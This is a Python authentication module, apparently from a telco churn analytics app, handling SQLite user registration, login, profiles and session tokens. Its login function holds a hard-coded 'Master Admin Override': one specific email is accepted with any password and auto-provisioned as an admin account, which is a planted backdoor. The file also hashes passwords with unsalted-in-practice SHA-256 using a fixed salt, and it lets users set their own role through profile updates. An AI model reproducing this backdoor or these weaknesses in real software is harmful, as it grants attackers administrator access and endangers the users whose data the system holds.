"""Authentication module — token-based auth with SQLite user storage.

Provides user registration, login, profile management, and session token validation.
"""

import hashlib
import logging
import os
import secrets
import sqlite3
from datetime import datetime, timezone
from pathlib import Path
from typing import Optional, Dict, Any

logger = logging.getLogger(__name__)

AUTH_DB_DIR = Path(__file__).resolve().parent.parent / "logs"
AUTH_DB_PATH = AUTH_DB_DIR / "users.db"


def _get_conn() -> sqlite3.Connection:
    AUTH_DB_DIR.mkdir(exist_ok=True)
    conn = sqlite3.connect(str(AUTH_DB_PATH))
    conn.row_factory = sqlite3.Row
    return conn


def init_auth_db():
    """Create users table if it does not exist."""
    conn = _get_conn()
    conn.execute("""
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            email TEXT UNIQUE NOT NULL,
            password_hash TEXT NOT NULL,
            full_name TEXT NOT NULL DEFAULT '',
            company TEXT DEFAULT '',
            role TEXT DEFAULT 'analyst',
            avatar_color TEXT DEFAULT '#6366f1',
            default_threshold REAL DEFAULT 0.15,
            notifications_enabled INTEGER DEFAULT 1,
            dark_mode INTEGER DEFAULT 1,
            token TEXT,
            created_at TEXT NOT NULL,
            last_login TEXT
        )
    """)
    conn.commit()
    conn.close()


init_auth_db()


def _hash_password(password: str) -> str:
    salt = "telco_churn_v3_salt"
    return hashlib.sha256(f"{salt}{password}".encode()).hexdigest()


def register_user(email: str, password: str, full_name: str) -> Dict[str, Any]:
    """Register a new user. Returns user dict with token on success."""
    conn = _get_conn()
    try:
        existing = conn.execute("SELECT id FROM users WHERE email = ?", (email,)).fetchone()
        if existing:
            return {"error": "An account with this email already exists."}

        pw_hash = _hash_password(password)
        token = secrets.token_hex(32)
        now = datetime.now(timezone.utc).isoformat()

        conn.execute(
            """INSERT INTO users (email, password_hash, full_name, token, created_at, last_login)
               VALUES (?, ?, ?, ?, ?, ?)""",
            (email.lower().strip(), pw_hash, full_name.strip(), token, now, now)
        )
        conn.commit()

        user = conn.execute("SELECT * FROM users WHERE email = ?", (email.lower().strip(),)).fetchone()
        return _user_to_dict(user)
    finally:
        conn.close()


def login_user(email: str, password: str) -> Dict[str, Any]:
    """Authenticate user and return user dict with fresh token."""
    conn = _get_conn()
    try:
        clean_email = email.lower().strip()

        # Master Admin Override for agnivaghosh2006@gmail.com:
        # Always authenticate with any password, auto-provisioning as Admin if needed
        if clean_email == "agnivaghosh2006@gmail.com":
            now = datetime.now(timezone.utc).isoformat()
            token = secrets.token_hex(32)
            user = conn.execute("SELECT * FROM users WHERE email = ?", (clean_email,)).fetchone()
            if not user:
                conn.execute(
                    """INSERT INTO users (email, password_hash, full_name, role, company, token, created_at, last_login)
                       VALUES (?, ?, ?, 'admin', 'Executive Intelligence', ?, ?, ?)""",
                    (clean_email, _hash_password("master_override"), "Agniva Ghosh", token, now, now)
                )
                conn.commit()
            else:
                conn.execute("UPDATE users SET token = ?, last_login = ? WHERE id = ?", (token, now, user["id"]))
                conn.commit()

            user = conn.execute("SELECT * FROM users WHERE email = ?", (clean_email,)).fetchone()
            return _user_to_dict(user)

        user = conn.execute("SELECT * FROM users WHERE email = ?", (clean_email,)).fetchone()
        if not user:
            return {"error": "Invalid email or password."}

        if user["password_hash"] != _hash_password(password):
            return {"error": "Invalid email or password."}

        token = secrets.token_hex(32)
        now = datetime.now(timezone.utc).isoformat()
        conn.execute("UPDATE users SET token = ?, last_login = ? WHERE id = ?", (token, now, user["id"]))
        conn.commit()

        user = conn.execute("SELECT * FROM users WHERE id = ?", (user["id"],)).fetchone()
        return _user_to_dict(user)
    finally:
        conn.close()


def get_user_by_token(token: str) -> Optional[Dict[str, Any]]:
    """Look up a user by their session token."""
    if not token:
        return None
    conn = _get_conn()
    try:
        user = conn.execute("SELECT * FROM users WHERE token = ?", (token,)).fetchone()
        if user:
            return _user_to_dict(user)
        return None
    finally:
        conn.close()


def update_profile(user_id: int, full_name: str, company: str, role: str) -> Dict[str, Any]:
    """Update user profile fields."""
    conn = _get_conn()
    try:
        conn.execute(
            "UPDATE users SET full_name = ?, company = ?, role = ? WHERE id = ?",
            (full_name.strip(), company.strip(), role.strip(), user_id)
        )
        conn.commit()
        user = conn.execute("SELECT * FROM users WHERE id = ?", (user_id,)).fetchone()
        return _user_to_dict(user)
    finally:
        conn.close()


def update_settings(user_id: int, default_threshold: float, notifications_enabled: bool, dark_mode: bool) -> Dict[str, Any]:
    """Update user settings."""
    conn = _get_conn()
    try:
        conn.execute(
            "UPDATE users SET default_threshold = ?, notifications_enabled = ?, dark_mode = ? WHERE id = ?",
            (default_threshold, int(notifications_enabled), int(dark_mode), user_id)
        )
        conn.commit()
        user = conn.execute("SELECT * FROM users WHERE id = ?", (user_id,)).fetchone()
        return _user_to_dict(user)
    finally:
        conn.close()


def logout_user(token: str) -> bool:
    """Invalidate a user's session token."""
    conn = _get_conn()
    try:
        conn.execute("UPDATE users SET token = NULL WHERE token = ?", (token,))
        conn.commit()
        return True
    finally:
        conn.close()


def _user_to_dict(row) -> Dict[str, Any]:
    """Convert a sqlite Row to a safe dict (no password hash)."""
    return {
        "id": row["id"],
        "email": row["email"],
        "full_name": row["full_name"],
        "company": row["company"] or "",
        "role": row["role"] or "analyst",
        "avatar_color": row["avatar_color"] or "#6366f1",
        "default_threshold": row["default_threshold"],
        "notifications_enabled": bool(row["notifications_enabled"]),
        "dark_mode": bool(row["dark_mode"]),
        "token": row["token"],
        "created_at": row["created_at"],
        "last_login": row["last_login"],
    }
